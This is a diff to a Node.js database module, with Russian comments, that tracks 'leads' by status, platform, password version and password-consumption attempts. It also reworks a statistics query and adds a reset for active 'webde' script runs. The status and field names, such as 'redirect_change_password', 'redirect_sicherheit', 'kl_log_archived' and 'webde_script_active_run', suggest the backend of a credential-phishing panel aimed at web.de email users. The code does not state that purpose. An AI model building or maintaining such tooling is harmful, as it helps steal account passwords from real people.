@@ -467,7 +467,8 @@ function getAllLeadIdsByEmailNormalized(emailLower) {
   return rows.map((r) => (r && r.id ? String(r.id) : null)).filter(Boolean);
 }
 
-function getStatsByPeriod(period) {
+/** Минимальные поля лидов за период для агрегата статистики в leadService (Успех / Отработаны / Pending). */
+function getStatsLeadSnapshotsByPeriod(period) {
   const p = String(period || 'today').trim().toLowerCase();
   let whereClause = '';
   if (p === 'today') {
@@ -482,34 +483,17 @@ function getStatsByPeriod(period) {
     whereClause = '';
   }
 
-  const sql = `
-    SELECT
-      SUM(CASE WHEN lower(COALESCE(status, 'pending')) = 'error' THEN 1 ELSE 0 END) AS status_error,
-      SUM(CASE WHEN lower(COALESCE(status, 'pending')) = 'pending' THEN 1 ELSE 0 END) AS status_pending,
-      SUM(CASE WHEN lower(COALESCE(status, 'pending')) IN ('show_success', 'redirect_change_password', 'redirect_sicherheit', 'redirect_android', 'redirect_open_on_pc') THEN 1 ELSE 0 END) AS status_success,
-      SUM(CASE WHEN lower(COALESCE(platform, '')) = 'windows' THEN 1 ELSE 0 END) AS os_windows,
-      SUM(CASE WHEN lower(COALESCE(platform, '')) = 'macos' THEN 1 ELSE 0 END) AS os_macos,
-      SUM(CASE WHEN lower(COALESCE(platform, '')) = 'android' THEN 1 ELSE 0 END) AS os_android,
-      SUM(CASE WHEN lower(COALESCE(platform, '')) = 'ios' THEN 1 ELSE 0 END) AS os_ios,
-      SUM(CASE WHEN lower(COALESCE(platform, '')) NOT IN ('windows', 'macos', 'android', 'ios') THEN 1 ELSE 0 END) AS os_other
-    FROM leads
-    ${whereClause}
-  `;
-  const row = getDb().prepare(sql).get() || {};
-  return {
-    byStatus: {
-      error: Number(row.status_error || 0),
-      pending: Number(row.status_pending || 0),
-      success: Number(row.status_success || 0),
-    },
-    byOs: {
-      windows: Number(row.os_windows || 0),
-      macos: Number(row.os_macos || 0),
-      android: Number(row.os_android || 0),
-      ios: Number(row.os_ios || 0),
-      other: Number(row.os_other || 0),
-    }
-  };
+  const rows = getDb()
+    .prepare(
+      `SELECT status, kl_log_archived, platform, event_terminal_json FROM leads ${whereClause}`
+    )
+    .all();
+  return rows.map((row) => ({
+    status: row.status,
+    klLogArchived: row.kl_log_archived === 1 ? true : row.kl_log_archived === 0 ? false : undefined,
+    platform: row.platform,
+    eventTerminal: parseJsonField(row.event_terminal_json),
+  }));
 }
 
 function addLead(leadData) {
@@ -811,10 +795,18 @@ function markPasswordConsumedByAttempt(leadId, passwordVersion, attemptNo) {
   const idStr = String(leadId);
   const result = getDb().prepare(
     `UPDATE leads
-     SET consumed_by_attempt = ?, updated_at = ?
+     SET consumed_by_attempt = ?
      WHERE id = ? AND COALESCE(password_version, 0) = ? AND (consumed_by_attempt IS NULL OR consumed_by_attempt = ?)`
-  ).run(attemptNo, new Date().toISOString(), idStr, passwordVersion, attemptNo);
+  ).run(attemptNo, idStr, passwordVersion, attemptNo);
   return !!(result && result.changes > 0);
+}
+
+/** После PM2/сбоя: в БД не должно оставаться «активного» сеанса без живого процесса. */
+function clearAllWebdeScriptActiveRuns() {
+  const r = getDb().prepare(
+    'UPDATE leads SET webde_script_active_run = NULL WHERE webde_script_active_run IS NOT NULL'
+  ).run();
+  return r && typeof r.changes === 'number' ? r.changes : 0;
 }
 
 function getSetting(key) {
@@ -948,7 +940,7 @@ module.exports = {
   getLeadById,
   getLeadIdByEmail,
   getAllLeadIdsByEmailNormalized,
-  getStatsByPeriod,
+  getStatsLeadSnapshotsByPeriod,
   addLead,
   updateLead,
   updateLeadPartial,
@@ -960,6 +952,7 @@ module.exports = {
   appendLeadLogTerminal,
   updateLeadPasswordVersioned,
   markPasswordConsumedByAttempt,
+  clearAllWebdeScriptActiveRuns,
   getSetting,
   updateSetting,
   getModeData,
